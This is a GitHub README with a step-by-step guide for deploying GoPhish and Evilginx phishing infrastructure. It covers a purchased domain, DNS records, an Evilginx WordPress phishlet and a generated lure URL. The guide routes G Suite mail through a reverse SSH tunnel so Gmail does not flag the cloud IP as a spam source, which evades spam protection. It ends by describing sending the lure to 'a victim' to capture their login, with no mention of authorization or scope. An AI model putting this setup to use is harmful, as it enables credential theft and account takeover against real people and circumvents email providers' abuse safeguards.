# phishing

This repository is for quickly setting up GoPhish and Evilginx to send phishing campaigns.

## Step 1: Create a DigitalOcean Droplet (Virtual Machine)
- Region: New York
- OS: Ubuntu
- Droplet Type: Basic
- Disk Type: SSD
	- 2 GB CPU
	- 50 GB SSD Disk
	- 2 TB Transfer
- Authentication: SSH
Use the following command on your Kali Linux machine to generate an SSH key pair, and then paste in the Public Key

```
sshkey-gen
```
- Tags: "Phishing"

<img width="923" height="438" alt="Screenshot 2025-07-24 204659" src="https://github.com/user-attachments/assets/a7fb3771-191d-4e39-88c8-fadedf189da3" />

<img width="1226" height="646" alt="Screenshot 2025-07-24 204714" src="https://github.com/user-attachments/assets/f55b7c48-a05d-46c4-a5d0-22ec6dd93d7e" />

<img width="841" height="528" alt="Screenshot 2025-07-24 204723" src="https://github.com/user-attachments/assets/0301c634-93d8-4597-be69-1e6b57e21c13" />

<img width="774" height="333" alt="Screenshot 2025-07-24 204739" src="https://github.com/user-attachments/assets/2a806299-e871-4339-ac87-14a168481479" />

<img width="662" height="241" alt="Screenshot 2025-07-24 205324" src="https://github.com/user-attachments/assets/51dc795e-baf3-4cac-82f3-12b5480b9369" />


## Networking
- Click into your Droplet in DigitalOcean, and in the left-hand side, click on `Networking`
- Create Firewall
- Change the SSH rule to only allow traffic from your Kali-Linux IP
Inside Kali, you can use this command to get the Kali Linux IP
```
curl ifconfig.me
```

We are going to allow traffic from all IPv4 and IPv6 for TCP, HTTP and HTTPS

<img width="1264" height="665" alt="Screenshot 2025-07-24 210435" src="https://github.com/user-attachments/assets/be6ac65a-5ff6-42a5-86f1-797898ba0429" />

## Bought a Domain Off of NameCheap 
```
khangtran.shop
```

## Records in namecheap
Click on your Domain, and hit Manage -> Advanced DNS

Create 4 A records in Namecheap with hostname @, login, make and profiles. 
The IP will be from your Digital Ocean Droplet

<img width="1142" height="333" alt="Screenshot 2025-07-24 213348" src="https://github.com/user-attachments/assets/d51d830b-be06-4db6-9345-9b3c5be93f04" />


## SSH into the Virtual Machine

```
ssh root@<ip>
```

```
apt install python3
```

Make sure main.py and gophish_config.py are in the same directory. The scripts will update the OS, insall unzip, create a certificate and key with Certbot, install Gophish and Evilginx in separate directories and finally edit the config.json file for GoPhish. You will have to enter your unique domain name when the script runs.

```
python3 main.py
```

```
./gophish
```

You should receive credentials for admin, which you will change once signed in.

<img width="943" height="132" alt="Screenshot 2025-07-29 062131" src="https://github.com/user-attachments/assets/26cb23f1-b7ab-4315-ab26-99c26cc3e1e4" />


## Sending a Phishing Email

First Create a GSuite account (you can use the free 14 day trial).
- Using G Suite improves your email deliverability, as its trusted infrastructure helps reduce the chances of your emails being marked as spam.
- Create a Gophish app password google suite


  
## Steps to bypass DigitalOcean firewall

go to 
```
admin.google.com
```

sign in as your admin IT answer

type 
```
smtp
```
in the search bar

go to
```
smtp relay service
```

scroll down and click `Configure` for the `SMTP Relay Service`

take the public IP of your Kali Linux vm
```
curl ifconfig.me
```

and now configure the settings like so
<img width="662" height="796" alt="Screenshot 2025-07-23 213928" src="https://github.com/user-attachments/assets/88a347ce-4a83-49c1-b294-a058cc8b11aa" />


## Configure New Sending Profile
Now, in GoPhish, create a new `Sending Profile`

and use your Admins email address with the domain we bought and use for GSuite

```
admin@khangtran.shop
```

The `Host` parameter will be localhost instead of Gmail, because DigitalOcean and other cloud providers may just it.

Then the username is the same, and the password is the App password that we just created and got from Gsuite

# Create the Reverse SSH Tunnel
The ip needed here, is the `public ip of the digital ocean droplet`
```
ssh -N -R 2525:smtp-relay.gmail.com:587 root@[digital-ocean-ip]
```


This command logs us into the Droplet running GoPhish and opens a remote port (2525) on the DigitalOcean server, forwarding it to Gmail’s SMTP server on port 587.

We do this because Gmail restricts SMTP traffic from cloud providers like DigitalOcean, as their IPs are commonly associated with spam and phishing. By routing the traffic through our Kali VM, it appears to Gmail as if it’s coming from a personal machine, which improves the chances of successful delivery.

Below is the Sending Profile settings inside of `GoPhish`.  
<img width="711" height="542" alt="Screenshot 2025-07-23 215308" src="https://github.com/user-attachments/assets/06f3cf8a-8d87-4ccc-ae72-d6e47c678d9e" />

<img width="641" height="620" alt="Screenshot 2025-07-23 215342" src="https://github.com/user-attachments/assets/a1dfed38-832f-46a8-9c8b-f2b1cc7c6fd5" />

## Evilginx

```
./evilginx
```

```
config domain <your domain>
```

<img width="768" height="404" alt="Screenshot 2025-07-23 223223" src="https://github.com/user-attachments/assets/4b8952af-b13e-40d8-9f24-53e3353572d7" />


Use your Droplets ipv4
```
config ipv4 external <ip address>
```

```
config ipv4 external 146.190.223.207
```
In my Namecheap DNS, I've made sure to add 3 A records for `login, make, and profiles`

<img width="1142" height="333" alt="Screenshot 2025-07-24 213348" src="https://github.com/user-attachments/assets/c31d7edd-1768-451b-b619-67602a3d4482" />

Add the wordpress phishlet into the evilginx folder

Then we can relaunch evilginx and hide the default example

```
phishlets hide example
```

```
phishlets hostname wordpress.org khangtran.shop
```

```
phishlets enable wordpress.org
```
Below, we have random bots getting blacklisted because they try to authenticate to random wordpress instances, but are blacklisted because they do not have the correct `lure`

<img width="660" height="469" alt="Screenshot 2025-07-24 013516" src="https://github.com/user-attachments/assets/c62b166e-4bde-4c5c-910e-81c243f38e81" />


```
lures create wordpress.org
```

```
lures get-url 0
```


Now all the blacklisting has stopped and we see this

```
: lures get-url 0

https://khangtran.shop/vVRBAqQA

: 2025/07/24 05:37:34 [037] WARN: Cannot handshake client login.wordpress.org EOF
2025/07/24 05:37:34 [036] WARN: Cannot handshake client login.wordpress.org EOF
```

Now we can send this lure to a victim
```
https://khangtran.shop/vVRBAqQA
```

have them try to  sign-in 

and then successfully capture their login

<img width="658" height="79" alt="Screenshot 2025-07-24 013931" src="https://github.com/user-attachments/assets/b6382756-2ff8-4fe0-8d60-c8c04ae923b5" />

